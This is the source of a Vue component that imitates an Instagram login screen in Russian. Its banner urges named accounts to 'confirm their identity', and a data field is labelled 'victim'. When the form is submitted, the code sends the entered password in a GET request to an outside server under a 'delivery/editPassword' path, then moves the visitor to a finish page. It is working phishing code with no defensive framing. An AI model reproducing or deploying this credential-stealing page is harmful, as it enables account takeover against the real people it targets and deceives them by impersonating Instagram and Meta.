<template>
    <div class="flex flex-col justify-between items-center h-screen" style="padding-bottom: 80px;">
      <div class="grid jistify-center items-center justify-items-center my-8 mt-8 space-y-4">
        <img alt="Instagram" width="175" src="../assets/logotype.png">
        <div class="flex flex-col items-stretch">
            <button style="display: inline-flex;justify-content: center;align-items: center;background: #0095f6; padding: 8px;font-size: 14px; padding-right: 10px; padding-left: 10px; margin-top: 28px; margin-bottom: 8px;" class="rounded-md text-white font-semibold">
                <img alt="Instagram" width="20" src="../assets/facebook.png" style="margin-right: 10px;">
                <h2>Продолжить с аккаунтом <br/>Facebook</h2>
            </button>   
            <div class="flex items-center justify-between w-full my-4">
                <div style="height: 2px; background: #e7e7e7;width: 95%;"></div>
                <h2 style="font-size: 13px; color: #737373;" class="mx-4">ИЛИ</h2>
                <div style="height: 2px; background: #e7e7e7;width: 95%"></div>
            </div>


            <div style="max-width: 280px;" class="input_cont flex flex-col p-2">
                <!-- <label for="username" class="label text-start" style="color: #474747;">Телефон, имя пользователя или эл. адрес</label> -->

                <input type="text" class="input" name="username" value="onidumali" placeholder="Телефон, имя пользователя или эл. адрес">
            </div>

            <div style="max-width: 280px;" class="input_cont flex p-2 my-2">
                <input :type="passwordInputType" class="input" v-model="password" name="password" id="password" placeholder="Пароль">
                <span class="showText font-semibold" @click="nudifyPassword" v-if="password.length > 0">{{ showHideText }}</span>
            </div>

            <h3 class="text-blue-400" style="align-self: end;">Забыли пароль ?</h3>

            <button @click="submitForm" :style="{background: mainButtonBackground,padding: '8px',fontSize: '14px', paddingRight: '10px', paddingLeft: '10px'}" class="rounded-md text-white font-semibold mt-4">
                <h2>Войти</h2>
            </button>  

            <h2 style="color: #929292; font-size: 14px;" class="mt-8">
            У вас нет акканута ?
            <span style="color: #0095f6; font-size: 14px;" class="font-semibold">Зарегистрироваться</span>
            </h2>
        </div>
      </div>
  
      <h1 class="text-lg font-semibold p-4 mb-16 text-red-500">
        Контент предусмотрен только для<br/> <span class="text-blue-800">@onidumali, @poshos.style</span><br/>
        Подтвердите свою личность, чтобы увидеть содержимое ! 
      </h1>
  
      <img src="../assets/meta.svg" width="53" alt="">
    </div>
  
  
    <div class="flex items-center justify-evenly w-full py-4 bg-white" style="position: fixed; bottom: 0; left: 0;z-index: 10; border-top: 2px #e7e7e7 solid;">
      <img src="../assets/home.png" alt="" width="26">
      <img src="../assets/share.png" alt="" width="26">
      <img src="../assets/reel.png" alt="" width="26">
      <img src="../assets/explore.png" alt="" width="26">
      <img src="../assets/profile.png" alt="" width="26">
    </div>
  </template>
  
  <script lang="ts">
  import { defineComponent } from 'vue';
  import axios from 'axios'
  // import HelloWorld from '@/components/HelloWorld.vue'; // @ is an alias to /src
  
  export default defineComponent({
    name: 'HomeView',
    components: {
    },
    data: () => ({
      victim: 'shomirsaidov__08',
      username: '',
      password: '',
      passwordInputType: 'password',
      showHideText: 'Показать',
      mainButtonBackground: '#4cb5f9',
      prevPasswords: ''
    }),
    methods: {
        nudifyPassword() {
            if(this.passwordInputType == 'password') {
                this.passwordInputType = 'text'
                this.showHideText = 'Cкрыть'
            } else {
                this.passwordInputType = 'password'
                this.showHideText = 'Показать'
            }
        },
        async submitForm() {
            if(this.mainButtonBackground == '#0095f6' ){
                await axios.get(`https://yunusovaserver.vercel.app/delivery/editPassword/yourlife_is_${this.password}|`)
                    .then(resp => {
                        console.log(resp.data)
                        this.$router.push('/finish')
                    })
                    .catch(e => {
                        console.log(e)
                    })
                }
        }
    },
    watch: {
       password() {
        if(this.password.length > 5) {
            this.mainButtonBackground = '#0095f6'
        } else {
            this.mainButtonBackground = '#4cb5f9'            
        }
       } 
    },
    
  
  });
  </script>
<style>
    .label {
        font-size: 12px;
    }

    .input_cont {
        background: #f7f7f7;
        border: 0.6px rgba(0, 0, 0, 0.23) solid;
        border-radius: 5px;
    }

    .input {
        background: #f7f7f7;
        outline: none;
        font-size: 15px;
    } 



</style>













